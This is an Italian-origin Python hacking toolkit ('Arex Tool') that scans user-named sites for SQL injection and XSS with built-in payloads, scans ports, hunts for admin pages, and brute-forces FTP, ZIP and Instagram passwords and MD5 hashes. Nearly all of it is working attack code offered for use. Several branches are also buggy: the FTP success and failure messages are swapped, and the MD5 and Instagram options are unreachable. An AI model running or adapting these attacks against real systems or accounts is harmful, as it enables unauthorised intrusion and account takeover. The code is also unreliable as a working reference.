#! usr/bin/python
# coding=utf-8
# Coded by Godlik, Erebo, M0nk3y

try:
    import socket, os, requests, re, zipfile, hashlib, json, time, sys, ftplib, itertools, string, platform
except Exception as e:
    print(" [!] Error Encurred: %s" %(e))

def _arex_():

    banner = """ _____                _____         _
|  _  |___ ___ _ _   |_   _|___ ___| |
|     |  _| -_|_'_|    | | | . | . | |
|__|__|_| |___|_,_|    |_| |___|___|_|

<! Coded By Godlik, Erebo, M0nk3y !>

!     Attenzione! Gli sviluppatori non si assumono nessuna responsabilita\' legale. Ricordiamo che la violazione di sistemi privati e' un atto punibile legalmente."""


    options = """
[OPTIONS]
---------

[Scanning]

<>  -s [SCAN] {sql} {xss} {port} -t [TARGET] <URL>
<>  -g {admin} {robots} -t [TARGET] <URL>

[Bruteforce]

<>  -b [BRUTEFORCE] <ftp> -t [TARGET] <URL> -u [USERNAME] <USERNAME> -l [LIST] <PASSWORD_LIST>
<>  -b [BRUTEFORCE] <zip> -p [PATH] <PATH> {-l [LIST] <PASSWPRD_LIST>} {-r [RANGE] <MIN> <MAX>}
<>  -b [BRUTEFORCE] <insta> -u [USERNAME] <USERNAME> -l [LIST] <PASSWPRD_LIST>

[Decrypter]

<>  -d [DECRYPT] <md5> -h [HASH] <MD5 HASH> -l [LIST] <LIST>
    """

    if sys.argv[1] == "":
        print(options)
        sys.exit()

    if sys.argv[1] == "-h":
        print(options)
        sys.exit()

    if sys.argv[1] == "-s":
        print(banner)

        if sys.argv[2] == "sql":

            if sys.argv[3] == "-t":

                try:
                    url = sys.argv[4]
                    if url[:4] != "http":
                        url = "http://" + url
                    time_ = time.strftime("%H:%M:%S")
                    print("\n [*] Inizio Scansione [%s]: %s\n" % (time_, url))
                    sl = re.search(r'([\w:/\._-]+\?[\w_-]+=)([\w_-]+)', url)
                    errori = ["mysql_num_rows()", "mysql_fetch_array()", "Error Occurred While Processing Request",
                              "Server Error in '/' Application", "Microsoft OLE DB Provider for ODBC Drivers error",
                              "error in your SQL syntax", "Invalid Querystring", "OLE DB Provider for ODBC",
                              "VBScript Runtime", "ADODB.Field", "BOF or EOF", "ADODB.Command", "JET Database",
                              "mysql_fetch_row()", "Syntax error", "include()", "mysql_fetch_assoc()",
                              "mysql_fetch_object()", "mysql_numrows()",
                              "GetArray()", "FetchRow()", "Input string was not in a correct format", "session_start()",
                              "array_merge()", "preg_match()", "ilesize()", "filesize() ", "SQL Error",
                              "[MySQL][ODBC 5.1 Driver][mysqld-4.1.22-community-nt-log]You have an error in your SQL syntax",
                              "You have an error in your SQL syntax", "mysql_query()", "mysql_fetch_object()",
                              "Query failed:", "Warning include() [function.include]", "mysql_num_rows()",
                              "Database Query Failed", "mysql_fetch_assoc()", "mysql_free_result()",
                              "Query failed (SELECT * FROM WHERE id = )", "num_rows", "Error Executing Database Query",
                              "Unclosed quotation mark", "Error Occured While Processing Request", "FetchRows()",
                              "Microsoft JET Database", "ODBC Microsoft Access Driver",
                              "OLE DB Provider for SQL Server", "SQLServer JDBC Driver",
                              "Error Executing Database Query", "ORA-01756", "getimagesize()", "unknown()",
                              "mysql_result()", "pg_exec()", "require()", "Microsoft JET Database",
                              "ADODB.Recordset", "500 - Internal server error", "Microsoft OLE DB Provider",
                              "Unclosed quotes", "ADODB.Command", "ADODB.Field error", "Microsoft VBScript",
                              "Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark",
                              "Microsoft OLE DB Provider for Oracle", "Active Server Pages error",
                              "OLE/DB provider returned message", "OLE DB Provider for ODBC",
                              "Unclosed quotation mark after the character string", "SQL Server", "Warning: odbc_",
                              "ORA-00921: unexpected end of SQL command", "ORA-01756", "ORA-", "Oracle ODBC",
                              "Oracle Error", "Oracle Driver", "Oracle DB2", "error ORA-",
                              "SQL command not properly ended", "DB2 ODBC", "DB2 error", "DB2 Driver", "ODBC SQL",
                              "ODBC DB2", "ODBC Driver", "ODBC Error", "ODBC Microsoft Access", "ODBC Oracle",
                              "ODBC Microsoft Access Driver", "Warning: pg_", "PostgreSql Error:", "function.pg",
                              "Supplied argument is not a valid PostgreSQL result",
                              "PostgreSQL query failed: ERROR: parser: parse error", ": pg_", "Warning: sybase_",
                              "function.sybase", "Sybase result index", "Sybase Error:", "Sybase: Server message:",
                              "sybase_", "ODBC Driver", "java.sql.SQLSyntaxErrorException: ORA-",
                              "org.springframework.jdbc.BadSqlGrammarException:", "javax.servlet.ServletException:",
                              "java.lang.NullPointerException", "Error Executing Database Query",
                              "SQLServer JDBC Driver", "JDBC SQL", "JDBC Oracle", "JDBC MySQL", "JDBC error",
                              "JDBC Driver", "java.io.IOException: InfinityDB", "Warning: include",
                              "Fatal error: include", "Warning: require", "Fatal error: require", "ADODB_Exception",
                              "Warning: include", "Warning: require_once", "function.include", "Disallowed Parent Path",
                              "function.require", "Warning: main", "Warning: session_start\(\)",
                              "Warning: getimagesize\(\)", "Warning: array_merge\(\)", "Warning: preg_match\(\)",
                              "GetArray\(\)", "FetchRow\(\)", "Warning: preg_", "Warning: ociexecute\(\)",
                              "Warning: ocifetchstatement\(\)", "PHP Warning:",
                              "Version Information: Microsoft .NET Framework", "Server.Execute Error",
                              "ASP.NET_SessionId", "ASP.NET is configured to show verbose error messages", "BOF or EOF",
                              "Unclosed quotation mark", "Error converting data type varchar to numeric",
                              "LuaPlayer ERROR:", "CGILua message", "Lua error", "Incorrect syntax near", "Fatal error",
                              "Invalid Querystring", "Input string was not in a correct format"]

                    urlinject = url + "'"
                    status = False
                    r = requests.get(urlinject)
                    tentativi = 0
                    if r.status_code == 200:
                        status = True
                        print(" [+] Trovata Possibile Vulnerabilita'")
                        time.sleep(0.5)
                        print(" [*] Analizzo la Query")
                        for error in errori:
                            tentativi += 1
                            status_ = False
                            inject = url + error
                            req = requests.get(inject)
                            html = req.text
                            if error in html:
                                status_ = True
                                time_ = time.strftime("%H:%M:%S")
                                print ("\n [+] SQL Injcetion! [%s] > %s \n [+] Error > '%s'" % (time_, url, error))
                                # print("\nVulnerabile: "  + host + "\nTipo di Errore: '" + error + "'")
                                break
                            else:
                                time_ = time.strftime("%H:%M:%S")
                                print(" [%s] Testing Payload ... [%s] >  %s" % (tentativi, time_, error))
                                # sys.stderr.flush()
                    if not status:
                        print("\n [!] Not online! > %s" % url)
                    elif status and not status_:
                        time_ = time.strftime("%H:%M:%S")
                        print("\n [-] Trovata possibile Falla, "
                              "ma il Sito non Restituisce Errori evidenti \n[%s] > %s"
                              % (time_, url))
                except Exception as e:
                    print(" [!] Exception Occurred: %s" % e)
                sys.exit()


        if sys.argv[2] == "xss":

            if sys.argv[3] == "-t":

                try:
                    url = sys.argv[4]
                    if url[:4] != "http":
                        url = "http://" + url
                    # estens = ["/product.php?id=", "/product.php?cat=", "/*.php?ProductId=", "/login"]
                    payload = ['"""><script>alert("Hacked by Arex");</script>', '<script>alert(123);</script>',
                               '<ScRipT>alert("XSS");</ScRipT>', '<script>alert(123)</script>',
                               '=%22%22%22%3E%3Cscript%3Ealert%28%22Hacked+by+Arex%22%29%3B%3C%2Fscript%3E']
                    time_ = time.strftime("%H:%M:%S")
                    print("\n [*] Start Scanning [%s]: %s\n" % (time_, url))
                    sl = re.search(r'([\w:/\._-]+\?[\w_-]+=)([\w_-]+)', url)
                    r = requests.get(url)
                    xss = ''
                    urlinject = url + "'"
                    status = False
                    r = requests.get(urlinject)
                    tentativi = 0
                    print(" [+] Analizing Vulnerabilities")
                    if r.status_code == 200:
                        status = True
                        time.sleep(0.5)
                        print(" [*] Analizing Query")
                        for payload in payload:
                            urlpayload = url + payload
                            req = requests.get(urlpayload)
                            html = req.text
                            if str(payload) in html:
                                xss = True
                                # print(html)
                                time_ = time.strftime("%H:%M:%S")
                                print ("\n [+] XSS Injcetion! [%s] > %s \n [+] Payload > '%s'" %
                                       (time_, url, str(payload)))
                                break

                            else:
                                xss = False
                                pass
                        if not xss:
                            time_ = time.strftime("%H:%M:%S")
                            print(
                                    "\n [-] Trovata possibile Falla, "
                                    "ma il Sito non Restituisce Errori evidenti \n[%s] > %s" % (time_, url))

                    else:
                        print("\n [!] Not Vulnerable [%s] > %s" % (time_, url))

                except Exception as e:
                    print("[!] Exception Encurred: %s" % e)
                sys.exit()

        if sys.argv[2] == "port":

            if sys.argv[3] == "-t":

                try:
                    url = sys.argv[4]
                    portlist = [20, 21, 22, 23, 25, 80, 443, 445, 3389, 8080]
                    time_ = time.strftime("%H:%M:%S")
                    print("\n [*] Start Scanning [%s]: %s" % (time_, url))
                    print("\n  Time\t\tPort\t\tConnection")
                    print("  ----\t\t----\t\t----------\n")

                    try:
                        for port in portlist:
                            time_ = time.strftime("%H:%M:%S")
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            if s.connect_ex((url, port)) == 0:
                                print("[%s]\t%s\t\t[OK]" % (time_, str(port)))
                            else:
                                print("[%s]\t%s\t\t-" % (time_, str(port)))
                    except KeyboardInterrupt:
                        pass

                    time_ = time.strftime("%H:%M:%S")
                    print("[%s] Scansione Terminata!")

                except Exception as e:
                    print("[!] Exception Encurred: %s" % e)
                sys.exit()

    elif sys.argv[1] == "-g":
        print(banner)

        if sys.argv[2] == "robots":

            if sys.argv[3] == "-t":

                try:
                    url = sys.argv[4]
                    if url[:4] != "http":
                        url = "http://" + url
                    time_ = time.strftime("%H:%M:%S")
                    print("\n [*] Start Scanning [%s]: %s" % (time_, url))
                    url = url + "/robots.txt"
                    time_ = time.strftime("%H:%M:%S")
                    print(" [*] Getting Robots.txt ... [%s]" % (time_))
                    robot = requests.get(url)
                    if robot.status_code == 200:
                        robot = robot.text
                        print("\n" + robot + "\n")
                        time_ = time.strftime("%H:%M:%S")
                        print(" [%s] Scanning End!" % (time_))
                    else:
                        print(" [!] Operation Failed, URL is not online")
                except Exception as e:
                    print(" [!] Exception Encurred: %s" % (e))
                sys.exit()

        if sys.argv[2] == "admin":

            if sys.argv[3] == "-t":
                url = sys.argv[4]
                if url[:4] != "http":
                    url = "http://" + url
                list_ = ["/admin", "/adm", "/administrador", "/administrator", "/admin/login.php", "/admin_login",
                         "/cgi-local/", "/sys/admin/", "/cpanel", "/adm/login.php", "/cgi/admin/", "/login.php",
                         "/login", "/user", "/admincontrol/login.php", "/administratorlogin.php", "/adm/index.php",
                         "/home.php", "/user.html",
                         "/login.html", "/administrator/", "/admin/", "/webadmin/", "/adminarea/", "/admin/account.php",
                         "/admin/index.php", "/siteadmin/login.php", "/siteadmin/index.php", "/admin/index.html",
                         "/admin/login.html", "/admin/account.html", "/admin/login.html", "/admin/admin.html",
                         "/admin/home.php", "/adminpanel.html", "/webadmin.html", "/admin_login.php", "/account.php",
                         "/adminpanel.php", "/user.html",
                         "/user.php", "/adm.html", "/adm/index.html", "/admincontrol/login.html", "/home.php",
                         "/admin.php", "/admin2.php", "/adm/index.php", "/affiliate.php", "/adm.php",
                         "/memberadmin.php", "/administratorlogin.php", "/adminLogin.php",
                         "/panel-administracion/index.php", "/usuarios/login.php", "/admin2.php", "/admin2/login.php",
                         "/admin2/index.php", "/panel-administracion/", "/bb-admin/", "/usuarios/",
                         "/usuario/", "/admin1/", "/admin2/", "/siteadmin/login.html", "/siteadmin/login.php",
                         "/siteadmin/index.php", "/admin/account.php", "/admin/account.html",
                         ]
                time_ = time.strftime("%H:%M:%S")
                print("\n [*] Start Scanning [%s]: %s" % (time_, url))
                try:
                    for page in list_:
                        url_ = url + page
                        r = requests.get(url_)
                        if r.status_code == 200:
                            time_ = time.strftime("%H:%M:%S")
                            print ("\n [+] Page Found [%s] > %s > %s\n" % (time_, url_, page))
                        else:
                            time_ = time.strftime("%H:%M:%S")
                            print(" [-] Page not Found [%s] > %s > %s" % (time_, url_, page))
                except requests.exceptions.ConnectionError:
                    print("[!] Scan Interrupt, the Requests get Blocked!")
                sys.exit()


    elif sys.argv[1] == "-b":
        print(banner)

        if sys.argv[2] == "zip":

            if sys.argv[3] == "-p":

                zipFile = sys.argv[4]
                if sys.argv[5] == "-l":
                    wordlist = sys.argv[6]
                if sys.argv[5] == "-r":
                    min = int(sys.argv[6])
                    max = int(sys.argv[7])
                    chrs = string.printable.replace(' \t\n\r\x0b\x0c', '')
                    print("[*] Preparing the Bruteforce ...")
                    wordlist = open('_wordlist_arex_tool.txt', 'w')
                    for n in range(min, max+1):
                        for xs in itertools.product(chrs, repeat=n):
                            saved = ''.join(xs)
                            wordlist.write("%s\n" %(saved))

                    wordlist.close()
                    wordlist = '_wordlist_arex_tool.txt'
            password = None
            tentativi = 0
            zipFile = zipfile.ZipFile(zipFile)
            with open(wordlist, 'r') as f:
                print("\n[+] Starting Bruteforcing ...")
                for line in f.readlines():
                    tentativi += 1
                    password = line.strip('\n')

                    try:
                        zipFile.extractall(pwd = password.encode('cp850','replace'))
                        time_ = time.strftime("%H:%M:%S")
                        print ("\n\n[%s] Password Found: { %s }" %(time_, password))
                        break

                    except RuntimeError:
                        time_ = time.strftime("%H:%M:%S")
                        print("[%s] Cracking ... [%s] >\t%s" %(time_, tentativi, password) )





        if sys.argv[2] == "ftp":

            if sys.argv[3] == "-t":

                url = sys.argv[4]
                if sys.argv[5] == "-u":

                    username = sys.argv[6]
                    if sys.argv[7] == "-l":

                        plist = sys.argv[8]
                        plist = open(plist, 'r')
                        time_ = time.strftime("%H:%M:%S")
                        print("\n [*] Attacking ... [%s]: %s" % (time_, url))
                        for password in plist.readlines():
                            password = password.strip('\r').strip('\n')
                            try:
                                ftp = ftplib.FTP(url)
                                ftp.login(user=username, passwd=password)
                                password = str(password)
                                print("\n--------------------------------------------------------\n[Non Trovato]\t  Username: %s\tPassword: %s" %(username, password))
                            except socket.gaierror:
                                print("Invalid Host")
                            except ftplib.error_perm:
                                time_ = time.strftime("%H:%M:%S")
                                print("[%s]  |  Username: %s  |  Password: %s" %(time_, username, password))
                            except KeyboardInterrupt:
                                print("\nInterpting Attack! ...\n")
                                break

        elif sys.argv[1] == "-b":

            if sys.argv[2] == "insta":

                if sys.argv[3] == "-u":
                    username = sys.argv[4]

                    if sys.argv[5] == "-l":

                        plist = sys.argv[6]
                        ip = requests.get("http://myexternalip.com/raw").text
                        print("[!] Your IP: " + ip[0:-1] + "\n[*]Remember to use a Proxy!")

                        r = requests.get("https://www.instagram.com/%s/?__a=1" %(username))
                        if r.status_code == 404:
                            print("[!] Username Doesn't exist!")
                            exit
                        if r.status_code == 200:
                            pass
                        with open(plist, 'r') as f:
                            passwordlist = f.readlines()
                        for _ in range(0, len(passwordlist)):
                            passwordlist[_] = passwordlist[_][0:-1]
                        delay = input(">> Enter the Delay: ")
                        n = 0
                        for password in passwordlist:
                            n += 1
                            try:

                                sess = requests.Session()
                                sess.cookies.update({'sessionid' : " ", "mid" : " ", "ig_pr" : "1", "ig_vw" : '1920', 'csrftoken' : " ",  's_network' : " ", 'ds_user_id' : " "})
                                sess.headers.update({
                                                'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
                                                'x-instagram-ajax':'1',
                                                'X-Requested-With': 'XMLHttpRequest',
                                                'origin': 'https://www.instagram.com',
                                                'ContentType' : 'application/x-www-form-urlencoded',
                                                'Connection': 'keep-alive',
                                                'Accept': '*/*',
                                                'Referer': 'https://www.instagram.com',
                                                'authority': 'www.instagram.com',
                                                'Host' : 'www.instagram.com',
                                                'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
                                                'Accept-Encoding' : 'gzip, deflate'
                                })

                                r = sess.get('https://www.instagram.com/')
                                sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

                                data = {'username':username, 'password':password}
                                r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
                                token = r.cookies.get_dict()['csrftoken']
                                sess.headers.update({'X-CSRFToken' : token})
                                data = json.loads(r.text)


                                if (data['authenticated'] == True):
                                    print("\n%s < > Found ! > [%s] Password: %s " %(username, str(n), password))
                                    break

                            except:
                                print("Testing: %s > [%s] Password: %s " %(username, str(n), password))
                                time.sleep(delay)


        if sys.argv == "-d":

            if sys.argv[2] == "md5":

                if sys.argv[3] == "-m":
                    mdhash = sys.argv[4]

                    if sys.argv[5] == "-l":
                        lista = sys.argv[6]
                        tentativi = 0
                        try:
                            lista = open(lista, 'r')
                        except ValueError:
                            exit
                        for passw in lista:
                            #b = bytes
                            tentativi += 1
                            passw = passw.encode('utf-8')
                            filep = hashlib.md5(passw.strip()).hexdigest()
                            passw = passw.decode('ascii').strip()
                            time_ = time.strftime("%H:%M:%S")
                            print("[%s] Testing ... [%s] >\t%s" %(time_, tentativi, passw))
                            if mdhash == filep:
                                time_ = time.strftime("%H:%M:%S")
                                print("\n[%s] Cracked! : [%s] >\t%s" %(time_, tentativi, passw))
                                break
                            else:
                                pass





if __name__ == '__main__':
    _arex_()
